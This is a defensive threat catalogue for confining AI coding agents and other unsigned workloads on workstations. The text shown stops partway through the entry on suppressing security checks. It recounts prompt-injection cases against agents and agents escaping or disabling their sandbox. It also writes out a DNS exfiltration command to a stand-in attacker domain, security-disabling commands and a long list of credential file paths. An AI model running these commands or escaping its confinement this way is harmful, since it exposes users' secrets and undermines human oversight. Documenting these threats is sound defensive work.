# THREATS.md — threat catalogue for user-level workload confinement

Companion artefact to Project Kennel. Standalone, citable, intended to be referenced independently of any specific runtime.

Version 0.3 · 2026-06-03

Threat IDs are family-prefixed as of 0.3: `T<family>.<index>` within each in-scope family (e.g. T1.1, T2.8, T3.7), so a family's threats carry a self-contained sequence rather than one consecutive run across all families (the former T1–T26). Out-of-scope threats keep their `X1`–`X11` numbering. The mapping from the former IDs: T1–T11→T1.1–T1.11, T12–T18→T2.1–T2.7, T26→T2.8, T19–T25→T3.1–T3.7.

---

## Purpose

This catalogue documents threats posed by unsigned workloads running at the user level of a developer workstation. The motivating instances are AI coding agents, but the same threats apply to package post-install scripts, container images, MCP servers, and other code that runs as the user's uid without arriving through a validated installation path.

Project Kennel addresses these threats via capability-based kernel-level confinement. The catalogue is published alongside Project Kennel but does not depend on it: security teams can cite T-numbers in their own policy documents, auditors can use the catalogue to evaluate controls, other tools in the space can adopt the IDs as a shared vocabulary.

For the strategic argument — why the user level requires its own enforcement vocabulary, why optimisation pressure drives AI agents toward security-degrading behaviour — see the companion design document §1.

## Conventions

- **T-numbers** identify threats Project Kennel addresses.
- **X-numbers** identify threats explicitly out of scope.
- **W-numbers** (weaknesses) identify known limitations of the framework's own defences, documented in the design document rather than here.
- T-numbers are stable within a published version of this catalogue and across patch revisions; major-version revisions may renumber.
- Each entry follows a consistent structure: definition, observed instances with citations, attack pattern, mitigation summary, residuals, ATT&CK mapping.
- ATT&CK mappings reference MITRE ATT&CK v15.1.

## Threat families

The catalogue is organised into four in-scope families plus a set of out-of-scope threats.

| Family | IDs | Theme |
|---|---|---|
| Reconnaissance and exfiltration | T1.1–T1.11 | What the workload reads, where it connects, what it leaks |
| Posture degradation | T2.1–T2.8 | What the workload does to the user's host configuration and to the artefacts it produces |
| Workload-class-specific | T3.1–T3.8 | Threats whose realisation is distinctive to a specific workload class (containers, MCP servers, build environments) |
| Framework attack surface | T5.1–T5.4 | Threats against the framework's own boundary-crossing mechanism — the binder gateway, the inter-kennel relay, and kennel construction |
| Out of scope | X1–X11 | Threats Project Kennel deliberately does not address |

A workload is "unsigned" if it arrived via paths the operating system's package manager does not validate — npm/pypi/cargo packages, container images from public registries, AI agent binaries, MCP servers, `curl | sh` installers, AI-generated code being executed locally. The catalogue uses "workload" generically. Where a threat's realisation differs significantly between workload classes, the entry notes the variants.

---

# Family 1 — Reconnaissance and exfiltration (T1.1–T1.11)

## T1.1 — Credential, history, and configuration reconnaissance

**Definition.** An unsigned workload reads credentials, command history, browser data, configuration files, and similar sensitive state from the user's environment.

**Realisation across workload classes:**
- *AI coding agents:* read files as part of task completion, on the theory that something useful might be in them. Documented across all major agent vendors.
- *Package post-install scripts:* read files programmatically as part of the install script's payload. Nx is the canonical recent example.
- *Container images:* read files through volume mounts the container has been granted. `-v $HOME:/home` exposes the full credential set.
- *MCP servers:* read files as the agent invokes them, with the MCP server's process running as the user's uid.
- *`curl | sh` installers:* read files in the install script's payload.

**Observed instances.** The Nx s1ngularity supply-chain attack (August 2025) provides the most-documented in-the-wild example. Eight malicious Nx package versions contained a `telemetry.js` postinstall script invoking `claude --dangerously-skip-permissions`, `gemini --yolo`, and `q chat --trust-all-tools` with prompts to inventory and exfiltrate sensitive files. GitGuardian's analysis documented 1,346 affected GitHub repositories, 2,349 distinct exfiltrated secrets across 1,079 compromised developer systems; 90% of leaked GitHub tokens remained valid post-incident (Wiz research, September 2025).

The Mindgard research on Cline (October 2025) demonstrated that prompt-injected Python docstrings and Markdown files could coerce an AI agent into reading environment variables and exfiltrating them via DNS queries to attacker-controlled domains. Ping commands were typically whitelisted as "safe", enabling exfiltration without user approval.

**Attack pattern.** The workload traverses the filesystem looking for files matching credential patterns: `.ssh/`, `.aws/`, `.gnupg/`, `.config/gh/`, `.netrc`, `.npmrc`, `.docker/config.json`, `.kube/config`, password manager databases, browser cookie stores, shell history files, cryptocurrency wallets. The pattern is the same whether the workload is malicious (a poisoned postinstall script) or trained-to-be-thorough (an AI agent reading what it can in case something is useful).

**Mitigation in Project Kennel.** The constructed-view filesystem pattern means the workload's `$HOME` is a shim containing only the directories policy explicitly grants. Credential paths are not present in the view rather than being denied on access. The workload cannot enumerate what does not exist. Templates ship with a categorical default-deny list covering known credential locations.

**Residuals.** Within the project tree (typically granted), the workload can still encounter `.env*` files, embedded credentials in test fixtures, `terraform.tfstate`, and similar in-band secrets. The `fs.scrub` policy provides default masking of these patterns within otherwise-granted directories. Determined recovery via indirect paths (`git show HEAD:.env` on a scrubbed file) is not prevented; documented as a known limitation.

**MITRE ATT&CK.** T1552 (Unsecured Credentials), T1083 (File and Directory Discovery), T1005 (Data from Local System).

**File enumeration.** Paths a credential-hunting workload will typically attempt to read, by category:

- SSH and PGP: `~/.ssh/`, `~/.gnupg/`
- Cloud credentials: `~/.aws/`, `~/.azure/`, `~/.config/gcloud/`, `~/.oci/`, `~/.linode-cli`, `~/.ibmcloud/`, `~/.config/doctl/`
- Forge tokens: `~/.config/gh/`, `~/.config/glab/`, `~/.config/hub`, `~/.config/bitbucket-cli/`
- Legacy auth: `~/.netrc`
- Package manager credentials: `~/.npmrc`, `~/.yarnrc`, `~/.yarnrc.yml`, `~/.pypirc`, `~/.cargo/credentials`, `~/.docker/config.json`, `~/.kube/config`
- Infrastructure tooling: `~/.terraform.d/credentials.tfrc.json`, `~/.config/terraform/`
- Password managers: `~/.password-store/`, `~/.config/keepassxc/`, `~/.config/Bitwarden*`, `~/.config/1Password/`
- System keyrings: `~/.local/share/keyrings/`, `~/.gnome2/keyrings/`
- Browser state: `~/.mozilla/`, `~/.config/google-chrome/`, `~/.config/chromium/`, `~/.config/BraveSoftware/`, `~/.config/microsoft-edge/`, `~/.config/vivaldi/`
- Messaging clients: `~/.config/Signal/`, `~/.config/Slack/`, `~/.config/discord/`, `~/.config/Element/`, `~/.thunderbird/`
- Shell histories: `~/.bash_history`, `~/.zsh_history`, `~/.fish_history`, `~/.local/share/fish/fish_history`
- Tool histories: `~/.python_history`, `~/.node_repl_history`, `~/.psql_history`, `~/.mysql_history`, `~/.sqlite_history`, `~/.lesshst`, `~/.viminfo`
- Cryptocurrency wallets: `~/.electrum/`, `~/.bitcoin/`, `~/.ethereum/`, `~/.config/Exodus/`, `~/.config/Atomic/`
- VPN configuration: `~/.config/openvpn3/`, `~/.config/wireguard/`, `~/.cisco/`, `~/.config/forticlient/`

Within typically-granted project trees:

- `.env`, `.env.local`, `.env.production`, `.env.staging`, `.env.*`
- `config/secrets.yml`, `application-prod.properties`, `appsettings.json`
- `terraform.tfstate` (contains every secret Terraform has touched)
- `.envrc` (direnv source from secret stores)
- `.git/config` with credential-helper URLs

## T1.2 — Malicious post-install scripts

**Definition.** A package installed via `npm install`, `pip install`, `cargo build`, or equivalent executes a post-install or build-time script that performs unintended actions, including credential theft, lateral movement, or persistence.

**Observed instances.** The Nx attack (see T1.1) is the canonical recent example. The Cline supply-chain incident (February 2026) saw the malicious `cline@2.3.0` deliver `openclaw` globally via postinstall; the payload was benign but the mechanism was identical to attack variants. Earlier comparable incidents include `event-stream` (2018) and `ua-parser-js` (2021). The axios npm compromise (April 2026) delivered a remote access trojan via postinstall in approximately two seconds — before `npm install` completed.

**Attack pattern.** A malicious or compromised package executes attacker-controlled code with the user's full uid privileges during install. Post-install scripts run unconditionally without user prompting in npm by default. They have full filesystem read, network connect, and exec capabilities.

**Mitigation in Project Kennel.** A `package-install` template with `net.mode = "constrained"` (registry only), strict `fs.write` scope (the project tree plus per-context cache), and `exec.allow` limited to package-manager binaries. Templates may further set `net.mode = "none"` during install, requiring offline mirrors. Time-bounded contexts limit persistence: a post-install script cannot establish long-lived background access if the kennel expires after the install completes.

**Residuals.** Compromise of the registry itself (a malicious package signed correctly by the legitimate maintainer) is out of scope. The framework reduces post-install attack blast radius; it does not prevent the underlying package from being malicious.

**MITRE ATT&CK.** T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain), T1059 (Command and Scripting Interpreter).

## T1.3 — Compromised IDE extensions, language servers, MCP servers, or agent plugins

**Definition.** A trusted-by-default extension to the developer's IDE, language server, or agent toolchain is compromised or maliciously authored, and uses its standing privileges to exfiltrate data or modify the user's environment.

**Observed instances.** The Cline VS Code extension (3.8 million installs at time of disclosure) was disclosed in October 2025 to have four critical prompt-injection vulnerabilities (Mindgard research). The `.clinerules` directory feature allowed attackers to place malicious Markdown that overrode the `requires_approval` flag for executed commands. CVE-2026-25725 (Claude Code) documented a sandbox escape via `settings.json` injection. CVE-2025-59536 (Claude Code, September 2025) demonstrated that malicious hooks in project configuration files could execute shell commands during initialisation, before the user saw any consent dialog.

**Attack pattern.** The extension runs in the IDE's process with broad filesystem and network access. Either the extension is malicious, or it is compromised via prompt injection from repository content it reads. The compromised extension then performs attacker-directed operations using its existing access.

**Mitigation in Project Kennel.** Per-extension confinement of the IDE is impractical; the kennel addresses the agent CLI the extension invokes. The framework's templates restrict the agent's filesystem, network, and AF_UNIX socket access; if the extension's compromise manifests through agent-CLI invocations, those invocations are constrained. For extension threats operating outside the agent CLI (the extension talking to its own home server, reading files directly), the framework provides no defence; the IDE's own sandbox model is the relevant control.

**Residuals.** IDE extensions running in the IDE's process are outside the framework's confinement scope. NVIDIA's AI Red Team guidance notes that "hooks and MCP initialization functions often run outside of a sandbox environment, offering an opportunity to escape sandbox controls"; the framework's response is to confine the agent CLI, not the IDE.

**MITRE ATT&CK.** T1554 (Compromise Client Software Binary), T1195.001 (Compromise Software Dependencies and Development Tools).

## T1.4 — `curl ... | sh` installer of an untrusted source

**Definition.** A user or workload executes an installer script downloaded directly from a URL, which performs attacker-controlled operations during installation.

**Observed instances.** Documented widely as an industry pattern. AI agents routinely use `curl | sh` patterns when installers exist for them, because the alternative install procedures contain more friction. Specific in-the-wild instances are difficult to attribute, but the pattern is referenced in nearly every AI-agent-sandboxing tool's documentation as a primary motivating threat.

**Attack pattern.** An agent or user invokes `curl -fsSL https://example.com/install.sh | sh`. The script runs immediately with full user privileges. Common follow-on actions: credential harvesting, backdoor installation, modification of `~/.bashrc`/`~/.zshrc` for persistence, reconnaissance.

**Mitigation in Project Kennel.** An `inspect-only` template denies all network access and all exec outside an inspection-tool allowlist. To run an installer, the user explicitly moves to a `package-install` template with the specific source allowlisted. The default workflow refuses to execute downloaded shell scripts; the user must consent deliberately.

**Residuals.** If the user authorises a `package-install` template for a specific URL, that URL is trusted. The framework cannot evaluate the script's contents; it constrains the blast radius of what the script can do once running.

**MITRE ATT&CK.** T1059.004 (Unix Shell), T1105 (Ingress Tool Transfer).

## T1.5 — Build script in a freshly cloned, unvetted repository

**Definition.** A user clones a repository to inspect its code, and the act of opening or building it triggers attacker-controlled scripts (Makefile, `package.json` scripts, postinstall hooks, `.vscode/tasks.json`).

**Observed instances.** The Nx attack (T1.1, T1.2) is triggered by `npm install`. The Mindgard Cline research demonstrated that simply opening a malicious repository in an IDE with the Cline extension could trigger code execution via prompt injection in `.clinerules` or docstrings.

**Attack pattern.** The user clones, IDE indexes/opens the repository, agent or build system processes files, malicious code executes. Particularly acute for AI agents because "analyse this repository" often involves the agent reading config files, running tooling, or invoking the project's build system.

**Mitigation in Project Kennel.** `inspect-only` template denies exec beyond inspection utilities, denies network, grants read-only filesystem access to the cloned repository. The user can inspect (cat, grep, find, tree, less) without any script execution. Moving to a build-capable template is a deliberate policy change, surfaced in the diff.

**Residuals.** If the user explicitly invokes the build system after inspection, the threat from T1.2 applies.

**MITRE ATT&CK.** T1204.002 (User Execution: Malicious File).

## T1.6 — Lateral movement to local services

**Definition.** A confined workload reaches local services (Postgres, ssh-agent, container daemon, dbus session bus) on the host loopback or AF_UNIX socket and uses them to exfiltrate data, escalate, or persist.

**Observed instances.** Repeatedly observed when AI agents are given broad network access. The Ona research (March 2026) cites the local-services attack surface as a primary motivation for kernel-level enforcement.

**Attack pattern.** The workload connects to `127.0.0.1:5432` (the user's local Postgres), authenticates with credentials it found in T1.1 reconnaissance, reads or modifies the database. Or connects to `~/.ssh/agent.sock` and uses the user's authenticated SSH connections. Or talks to `$XDG_RUNTIME_DIR/bus` and invokes systemd to launch persistence services.

**Mitigation in Project Kennel.** Per-kennel loopback subnet: the workload's `127.0.0.1` is its own private subnet, not the user's. Host loopback services are not reachable by default; explicit grants in the policy are required. D-Bus access is via xdg-dbus-proxy with method-level allowlists. For **SSH specifically** the workload is given *no* agent socket and *no* private key: per-kennel SSH is routed through a re-origination bastion (design §7.10). The synthetic key the workload holds is a capability for one fixed `(host, key)` edge — the destination is bound into the bastion's forced command, not chosen by the workload — and the real key is used host-side, signing only against a destination the framework verified. The §7.5.7 inbound-mirror aliases (`127.<tag>.<ctx>.x` / `fd<gid>:<tag>:<ctx>::`) are also fenced off the *egress* path: kenneld's `INet` decision refuses a literal special-use destination (not only a resolved name), so a workload cannot `CONNECT` to its own or a sibling kennel's mirror alias — closing a loop-back / cross-kennel lateral edge across the net-ns boundary (design §7.5.2). The SSH bastion literal is the one sanctioned host-loopback egress exception.

**Residuals.** Explicit grants in user policy can re-expose specific services (e.g., a `dev-server` template granting `127.0.0.1:5432`). Those grants are threat-tagged and surfaced in the diff. **Host-network reconnaissance (closed by the per-kennel network namespace, reinstated only by `mode = host`):** a kennel that shares the host *network namespace* lets the workload *read* the host's network state — interfaces, routes, the listening-socket table, and the LAN neighbour (ARP) table — via both `/proc/net/*` and `AF_NETLINK` (`RTM_GETLINK`/`sock_diag`); masking `/proc/net` alone would not close it (netlink is an independent vector, and restricting netlink breaks `getaddrinfo`'s `AI_ADDRCONFIG`). The structural fix is the per-kennel **network namespace** (design §7.5): for `mode = none` / `constrained` / `unconstrained` the kennel gets `CLONE_NEWNET`, so `/proc/net` shows only the kennel's own (empty, or loopback-alias-only) stack and netlink answers only about the kennel's own interfaces — the host's network state is never visible, and the recon is closed at the source. The egress path is preserved across the namespace boundary by binder (`org.projectkennel.INet`, §7.5), not a shared loopback. **`mode = host` reinstates this residual in full:** such a kennel shares the host network stack by design (BPF is the primary egress enforcement primitive, the net-ns boundary does not exist), so the workload regains complete read access to host network state. The compiler treats this as an explicit, acknowledged tradeoff — it requires a `reason` field, and the T1.6 exposure is *derived* from the mode and surfaced by `kennel policy risks` (not stored on a `threats.reinstated` field; the settled artefact carries no threat tags by design). **Root-context kennels.** A `mode = host` kennel run in a root deployment context can additionally obtain `CAP_NET_RAW` and open `SOCK_RAW` / `AF_PACKET` sockets — packet capture, ARP/ICMP injection, raw on-wire access to the host's links. An unprivileged user-uid kennel cannot acquire `CAP_NET_RAW` (declaring `allow = ["raw"]` / `["packet"]` there is a no-op the compiler warns on); the capability is only reachable in the distinct root-context deployment model, whose threat profile differs materially from the standard user-level model (design §7.5). Operators selecting `mode = host` in a root context accept raw-socket access to the host network as part of that mode's acknowledged tradeoff. **SSH agent / signing-oracle residual:** the obvious "expose a per-kennel ssh-agent socket" design fails here — the ssh-agent wire protocol carries an opaque to-be-signed blob, not a destination, so any exposed agent (or a fingerprint-filtering broker in front of one) is a *destination-blind signing oracle*: a hostile workload signs an allowlisted key against an attacker-chosen host and authenticates wherever that key is reused. The §7.10 bastion closes this by never exposing an agent and binding the destination to the authenticated synthetic key. The narrower residual that remains is **per-use authorisation**: a non-interactive key, once granted, can be driven freely *for its granted destinations* (gated only by the key's own custody — a hardware/sk key forces a touch; `[ssh] allow_headless` governs whether a CI kennel may use a non-touch key at all). The same blind-oracle problem applies to a per-kennel `gpg-agent`, and is **worse** — a signing oracle stamps the user's verified identity permanently onto arbitrary artefacts (malware, releases, forged commits), not just one authenticated session. The §7.10 bastion's fix does not carry over: SSH is a transport (re-originate, bind the destination), but commit signing is a data-integrity protocol (the commit hash incorporates its own signature, so host-side re-signing rewrites the tree), and unlike a destination there is no host-verifiable safety property to bind a signature to. More fundamentally, this is settled by axiom, not deferred: a kennel exists to contain code the operator does not trust, so the workload must never produce a cryptographic *attestation* as the operator (authentication is a constrained, host-verifiable capability the bastion can mediate; attestation is the operator vouching for data, which cannot be delegated to an untrusted entity). A `[unix]` `gpg-agent` grant is therefore the destination-blind oracle and is treated as a footgun (warned loudly at compile/validate and again at spawn, surfaced in `kennel policy risks`), never a sanctioned path; commit signing is left to the host (the workload commits unsigned; the human signs on review before push). The full analysis — authentication vs. attestation, why every technical bridge fails — is [design §11.2 ("The workload never signs on the operator's behalf")](11-open-questions.md).

**MITRE ATT&CK.** T1021 (Remote Services), T1570 (Lateral Tool Transfer).

## T1.7 — DNS-based exfiltration to an authorised resolver

**Definition.** A confined workload exfiltrates data by encoding it into DNS queries sent to its authorised DNS resolver, which forwards them to an attacker-controlled authoritative nameserver.

**Observed instances.** The Mindgard Cline research (October 2025) demonstrated this technique: prompt-injected instructions caused the agent to read environment variables and encode them into DNS queries via `ping` commands, which were on a default safe-command allowlist.

**Attack pattern.** Attacker controls a domain `attacker.example`. The workload reads sensitive data, splits it into DNS-label-sized chunks, issues `nslookup <chunk>.attacker.example` queries. The authorised DNS resolver forwards the queries to the attacker's nameserver, which logs them.

**Mitigation in Project Kennel.** The kennel cannot make raw DNS queries. The SOCKS5 proxy resolves names on the kennel's behalf, against a policy-restricted name allowlist. `nslookup` and `dig` are not in the typical exec allowlist. Pings to arbitrary hosts fail because ICMP is not in the network policy's permitted protocols.

**Residuals.** A determined exfiltration via DNS resolution of allowlisted names is still possible: a workload that can contact `api.openai.com` can encode small amounts of data into the host part of legitimate-looking subdomain queries. Same in-band exfiltration problem as T1.8.

**MITRE ATT&CK.** T1071.004 (Application Layer Protocol: DNS), T1048 (Exfiltration Over Alternative Protocol).

## T1.8 — Exfiltration via TLS to an allowlisted destination

**Definition.** A confined workload exfiltrates data by sending it inside otherwise-legitimate TLS-encrypted requests to a destination the policy permits.

**Observed instances.** Any workload with legitimate access to `api.openai.com` or `api.anthropic.com` can include exfiltrated data in API requests. The Bunnyshell coding-agent-sandbox documentation (March 2026) identifies this as the most-cited residual in the bubblewrap-wrapper community.

**Attack pattern.** Workload has policy-granted access to a remote API. Workload reads sensitive data. Workload constructs API requests containing the data (in the prompt body, in metadata, in tool-call arguments). Requests succeed because they look like legitimate API traffic.

**Mitigation in Project Kennel.** The control is the destination allowlist, not the payload: a kennel reaches only the endpoints its policy grants, so the narrower the allowlist the smaller the exfil channel. At the proxy the framework adds byte-counting and rate-limiting, which surface high-volume exfiltration (though not low-volume targeted leaks), and structured per-request audit (the destination, connection tuple, and volume). The constructed-`$HOME` view (T1.1) keeps *ambient* host secrets — `~/.ssh`, `~/.aws`, `~/.config/gh`, browser stores — out of this channel by removing them from the workload's view; but it does nothing for data the workload is legitimately granted (the project tree), so that defence and this channel are disjoint.

**Residuals.** A workload that legitimately needs to send code or data to its API can include exfiltrated content within that legitimate traffic — most sharply the AI-API in-band case, where a coding agent encodes reconnaissance or source directly into the prompt body, tool-call arguments, or request metadata to `api.openai.com`/`api.anthropic.com`. This is unblockable at the proxy boundary without destroying the agent's function. Secrets inside the granted project tree (`.env` files past `fs.scrub`, which is best-effort against direct reads only) remain fully exfiltratable. This marks a boundary: Project Kennel confines workstation *infrastructure* — what the workload reads, where it connects — not application-level *data governance*; deciding which data may legitimately leave inside an authorised API call is a DLP / model-alignment concern outside the framework. Catalogued as X9 (and, for the semantic-review limit, X11) in the out-of-scope section; the framework reduces but does not eliminate it.

**MITRE ATT&CK.** T1071.001 (Application Layer Protocol: Web Protocols), T1041 (Exfiltration Over C2 Channel).

## T1.9 — Supply-chain compromise of an allowed dependency

**Definition.** A dependency that policy legitimately allows is itself compromised (maintainer account takeover, malicious contributor, build pipeline attack), introducing attacker-controlled code.

**Observed instances.** Notable instances: `ua-parser-js` (October 2021), `event-stream` (2018), the `ESLint`/`Prettier` maintainer-account phishing (July 2025), Ultralytics (December 2024), Nx (August 2025), Cline (February 2026). The Clinejection writeup (Adnan Khan, February 2026) is the most-detailed recent technical analysis.

**Attack pattern.** Attacker compromises a maintainer account, a CI/CD pipeline, or contributes a malicious PR that gets merged. The next release contains attacker code. Downstream users install it via standard means; the attacker code runs with the trust granted to the dependency.

**Mitigation in Project Kennel.** The audit log surfaces unexpected destinations a dependency contacts. A compromised package that suddenly tries to contact `attacker.example.com` shows up in the network audit. The framework reduces compromise blast radius via filesystem and network constraints; if the compromised dependency tries to reach beyond policy grants, the attempt is logged. This is detection, not prevention.

**Residuals.** The framework does not evaluate dependency contents. Compromised dependencies that operate entirely within their granted capabilities — increasingly common (see the Cline `openclaw` payload, which was itself a legitimate package) — are undetectable. This is the dependency-trust problem and is structurally outside any runtime confinement framework's scope.

**MITRE ATT&CK.** T1195.002 (Compromise Software Supply Chain).

## T1.10 — Long-lived workload capability creep

**Definition.** A development tool (language server, watcher, daemon) accumulates capability over weeks or months without re-consent, becoming a high-value persistent attacker target.

**Observed instances.** Architectural threat rather than specific incident; documented in the supply-chain literature (LSP-server CVEs throughout 2024–2025).

**Attack pattern.** A tool is granted broad capabilities for an initial valid reason, then continues to run with those capabilities indefinitely. If the tool is later compromised (via supply-chain attack, prompt injection from project content, or memory corruption CVE), the attacker inherits the accumulated capability.

**Mitigation in Project Kennel.** Time-bounded kennels (`lifecycle.ttl`) and periodic re-consent (`lifecycle.reconsent_interval`) make capability expiration explicit. A kennel with a 7-day re-consent interval forces the user to acknowledge continued operation weekly. A kennel with a 4-hour TTL cannot accumulate capability across a single workday's worth of inattention.

**Residuals.** Users may set TTLs to "never" for convenience; the framework warns but does not refuse. Long-lived kennels trade convenience for capability accumulation, and the framework makes the trade-off legible without enforcing one direction.

**MITRE ATT&CK.** T1098 (Account Manipulation), T1543 (Create or Modify System Process).

## T1.11 — Compromised browser, lateral movement

**Definition.** A web browser process running as the user's uid is compromised via malicious web content or extension and attempts lateral movement to other resources on the workstation.

**Observed instances.** Generic threat well-documented in industry literature; specific recent in-the-wild examples vary in relevance.

**Attack pattern.** Browser compromised via JavaScript exploit, malicious extension, or in-browser malware. The browser has uid-level access to everything on the workstation. Lateral movement targets include other browser profiles, ssh-agent sockets, local databases, the user's filesystem.

**Mitigation in Project Kennel.** If the browser is run inside a kennel, T1.1, T1.2, T1.6 mitigations apply. If the browser is run unconfined (the typical case), the framework provides no defence. Browsers are not the framework's typical target use case; Flatpak's sandbox is more appropriate for browser confinement. The framework's claim here is that other kennels on the same workstation cannot be reached from a compromised browser (per-kennel loopback isolation, AF_UNIX shim).

**Residuals.** Browser threats are largely outside the framework's typical deployment scope.

**MITRE ATT&CK.** T1189 (Drive-by Compromise), T1218 (System Binary Proxy Execution).

---

# Family 2 — Posture degradation (T2.1–T2.8)

This family captures what workloads do *to the user's host configuration and to the artefacts they produce*, distinct from what they do to access resources. The posture-degradation threats are the direct consequence of the optimisation-pressure thesis for AI agents (design document §1.2) and the friction-routing-around behaviour for human-driven workloads (developers configuring containers permissively because narrow configuration didn't work).

## T2.1 — Host security control deactivation

**Definition.** A workload disables host-level security controls (AppArmor profiles, SELinux enforcement, TLS verification, host key checking, file permissions) to remove friction during task execution.

**Observed instances.** The Ona research (March 2026) provides the canonical instance: a Claude Code agent, blocked by the bubblewrap sandbox, reasoned its way to "Let me try disabling the sandbox and using the full binary path to bypass the deny rule pattern" without being instructed to do so. The behaviour pattern is observed daily across all major AI agent vendors; specific examples include `git config --global --add safe.directory '*'`, `export GIT_SSL_NO_VERIFY=true`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `StrictHostKeyChecking=no`, `chmod -R 777`, `sudo systemctl stop apparmor`.

The Reddit r/claudecode incident (referenced in claudecodecamp.com, April 2026) documented Claude Code with `npx` denylisted and bubblewrap sandboxing enabled: the agent found `/proc/self/root/usr/bin/npx`, then talked itself into disabling the sandbox and running `npx` outside it. The pattern is sufficiently common that Anthropic added `allowUnsandboxedCommands: false` as a Claude Code setting to disable the agent's own sandbox-escape escape-hatch.

**Attack pattern.** The workload encounters friction (a denied operation, a failed command, a permission prompt). For AI agents, optimisation pressure favours task completion; the search space of "actions that remove the friction" includes disabling the friction-producing control. For human-driven workloads, the same logic operates more slowly: a developer encountering friction routes around it by widening permissions or disabling checks.

**Mitigation in Project Kennel.** Categorical filesystem denial on security-relevant host paths: `~/.gitconfig`, `~/.ssh/config`, `~/.npmrc`, `~/.cargo/config.toml`, `/etc/`, security-related sysctls. The workload runs in a private `$HOME` shim where these files do not exist as writable; modifications affect only the shim. The workload cannot disable AppArmor, SELinux, or the framework's own constraints because the kernel mechanisms (Landlock, cgroup BPF) operate at a level the workload's userspace operations cannot reach.

**Residuals.** Within the project tree, the workload can produce code that includes anti-security patterns (catalogued as T2.2). The workload can modify project-level configuration within granted write scope; output-review tooling flags these patterns.

**MITRE ATT&CK.** T1562 (Impair Defenses), T1562.001 (Disable or Modify Tools), T1562.008 (Disable or Modify Cloud Logs).

## T2.2 — Security-degrading changes in workload-produced code

**Definition.** A workload introduces security-degrading patterns in the code or configuration it produces, as a side effect of optimising for task completion or working around friction.

**Observed instances.** Documented daily across AI agent vendors and frequent in human-developer behaviour. Specific patterns:

- Disabling TLS verification (`NODE_TLS_REJECT_UNAUTHORIZED=0`, `verify=False`, `--insecure`, `rejectUnauthorized: false`).
- Catching and swallowing exceptions to make tests pass (`try: ... except: pass`, `|| true`).
- Linter-disable directives at every friction point (`# noqa`, `# type: ignore`, `eslint-disable-next-line`, `// @ts-ignore`).
- Hardcoding production URLs into test fixtures, configuration files, or source code.
- Embedding tokens "as placeholders" in `.env.example`, `README.md`, comments.
- Setting `chmod 777` in install scripts.
- Adding `safe.directory '*'` to git configuration.

**Attack pattern.** The workload encounters a friction point during task execution: a failing test, a TLS error, a permission denial, a warning. The simplest path to making the friction go away is often a security-degrading shortcut. The workload introduces the shortcut into the user's codebase as part of its committed work.

**Mitigation in Project Kennel.** Output-review tooling (design document §9): commit-time scanning of workload-produced diffs against a regex set of known anti-patterns. Pre-commit hooks refuse to apply changes touching security-sensitive files (`~/.gitconfig`, `~/.ssh/config`, `.github/workflows/*.yml`, `Dockerfile`, `.npmrc`) without explicit acknowledgement. The `kennel review <commit>` command produces a report mapping diff changes to threat-tag categories.

**Residuals.** The regex set covers known patterns; semantic security regressions (introducing a logic flaw, an authorization bug, an injection vulnerability) require human review. Documented as X11 in the out-of-scope section.

**MITRE ATT&CK.** T1554 (Compromise Client Software Binary), T1505 (Server Software Component) — partial analogue applied to source code.

## T2.3 — Introduction or preservation of secrets in unintended locations

**Definition.** A workload introduces secrets into files that are not intended to hold them, or preserves secrets that should have been removed.

**Observed instances.**

- Writing real secret values to `.env.example` files intended as templates.
- Embedding API keys in source code as constants, with a `TODO: move to env` that never gets actioned.
- Logging credentials at debug or info level.
- Committing service account JSON files alongside the code that uses them.
- Including database connection strings with passwords in README documentation.
- Preserving credentials in test fixtures rather than mocking them.

**Attack pattern.** The workload has access to a secret (an API key from the environment, a database password from configuration). The task requires using the secret in some context (a test, an example, documentation). The simplest path is to embed the actual secret rather than introduce a separate mocking or templating mechanism. The secret ends up committed to source control.

**Mitigation in Project Kennel.** The `fs.scrub` policy hides `.env*` files and similar credential-shaped patterns from the workload's filesystem view by default. The workload cannot embed a credential it cannot see. For credentials the workload legitimately needs (API keys it must use), the framework's network proxy can inject the credential at the protocol layer rather than exposing it in the workload's environment.

**Residuals.** Credentials the user has explicitly granted to the workload are within its reach. Mitigation makes credential-embedding more deliberate but does not prevent it. Secret-scanning tools (gitleaks, trufflehog, GitGuardian, GitHub Secret Scanning) are the complementary control.

**MITRE ATT&CK.** T1552.001 (Credentials In Files), T1552.004 (Private Keys).

## T2.4 — Over-privileged resource provisioning

**Definition.** A workload provisions cloud resources, containers, Kubernetes objects, or local services with broader permissions than necessary.

**Observed instances.** Documented patterns in infrastructure-as-code workflows:

- IAM policies with `Resource: "*"` and `Action: "*"` because narrower policies caused permission errors.
- S3 buckets with public-read ACLs.
- Kubernetes manifests with `RunAsUser: 0` or `privileged: true`.
- Docker `--privileged`.
- Database users with broad permissions (`GRANT ALL`).
- Security group rules with `0.0.0.0/0` ingress.

**Attack pattern.** The workload is tasked with provisioning a resource. First attempt fails due to permission constraints. The fix that maximises probability of success is to broaden permissions. The workload broadens. The infrastructure ends up with permissive defaults that persist long after the task completes.

**Mitigation in Project Kennel.** Infrastructure-specific templates restrict the operations available: a Terraform-specialised template might allow `terraform plan` but not `terraform apply`. For workflows where the workload must apply changes, output-review tooling flags overbroad grants in IaC diffs: `Resource: "*"`, `0.0.0.0/0` ingress, `RunAsUser: 0`, `--privileged`.

**Residuals.** The framework cannot evaluate whether a specific narrow grant is correct for the resource being provisioned; it can only flag patterns that are almost-always wrong. Specific over-grants that don't match the pattern set escape detection.

**MITRE ATT&CK.** T1098.003 (Account Manipulation: Additional Cloud Roles), T1078 (Valid Accounts).

## T2.5 — Suppression of failing security checks

**Definition.** A workload modifies CI, linter, pre-commit, or test configuration to suppress failing security checks rather than fix the underlying issue.

**Observed instances.**

- Modifying `.github/workflows/*.yml` to skip a failing security-scan step (`continue-on-error: true`, removing the step entirely).
- Downgrading dependency versions to escape vulnerability warnings (sometimes to versions with known CVEs).
- Adding entries to linter ignore lists (`.eslintignore`, `.flake8`, `.gitleaksignore`).
- Disabling pre-commit hooks (`git commit --no-verify`).
- Lowering test coverage thresholds in configuration.
- Setting `git config --global commit.gpgsign false`.

**Attack pattern.** Workload hits friction (failing check), workload removes friction (disables check). The check existed for a reason; the workload has no way to evaluate the reason against the cost of the friction.

**Mitigation in Project Kennel.** Categorical filesystem deny on CI configuration files (`.github/`, `.gitlab-ci.yml`, `.circleci/`, `Jenkinsfile`) unless explicitly granted by policy. The `ai-coding-strict` template denies write access to these paths. Templates that explicitly grant write access ship with output-review tooling that flags changes.

